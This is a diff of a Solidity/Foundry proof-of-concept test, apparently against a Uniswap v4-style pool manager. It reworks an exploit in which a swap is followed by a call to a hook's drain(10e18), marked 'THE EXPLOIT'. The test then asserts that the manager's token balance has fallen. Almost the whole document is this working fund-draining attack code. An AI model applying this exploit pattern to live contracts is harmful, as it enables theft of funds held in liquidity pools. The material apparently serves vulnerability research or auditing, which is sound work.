@@ -48,41 +48,30 @@ contract POC is Test {
         Currency c1 = Currency.wrap(address(token1));
         uint256 action = abi.decode(data,(uint256));
         if(action==1){
-            (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
-            int128 amt0 = delta.amount0();
-            int128 amt1 = delta.amount1();
-            if (amt0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-amt0)); manager.settle(); }
-            if (amt1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-amt1)); manager.settle(); }
-            if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
-            if (amt1 > 0) manager.take(c1, address(this), uint128(amt1));
+            (BalanceDelta d,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
+            if(d.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-d.amount0())); manager.settle();}
+            if(d.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-d.amount1())); manager.settle();}
+            if(d.amount0()>0) manager.take(c0, address(this), uint128(d.amount0()));
+            if(d.amount1()>0) manager.take(c1, address(this), uint128(d.amount1()));
         } else {
-            console.log("DOING SWAP NOW");
-            BalanceDelta sDelta = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            int128 s0 = sDelta.amount0();
-            int128 s1 = sDelta.amount1();
-            console.log("SWAP s0"); console.logInt(s0);
-            console.log("SWAP s1"); console.logInt(s1);
-            if (s0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-s0)); manager.settle(); }
-            if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
-            if (s0 > 0) manager.take(c0, address(this), uint128(s0));
-            if (s1 > 0) manager.take(c1, address(this), uint128(s1));
-            // FIX FOR CurrencyNotSettled: take the hook's 10e18 fake credit
-            console.log("Taking hook credit 10e18");
-            manager.take(c0, address(this), 10e18);
+            BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
+            console.logInt(s.amount0());
+            console.logInt(s.amount1());
+            if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
+            if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
+            if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
+            if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
+            // THE EXPLOIT - use the hook's drain function, it knows the right currency
+            hook.drain(10e18);
         }
         return "";
     }
 
     function test_afterSwapReturnDelta() public {
-        uint bBefore = token0.balanceOf(address(manager));
-        uint myBefore = token0.balanceOf(address(this));
+        uint bBefore = token1.balanceOf(address(manager));
         manager.unlock(abi.encode(uint256(2)));
-        uint bAfter = token0.balanceOf(address(manager));
-        uint myAfter = token0.balanceOf(address(this));
-        console.log("MANAGER BEFORE:", bBefore);
-        console.log("MANAGER AFTER:", bAfter);
-        console.log("MANAGER LOSS:", bBefore - bAfter);
-        console.log("MY PROFIT:", myAfter - myBefore);
+        uint bAfter = token1.balanceOf(address(manager));
+        console.log("LOSS:", bBefore - bAfter);
         assertLt(bAfter, bBefore);
     }
 }
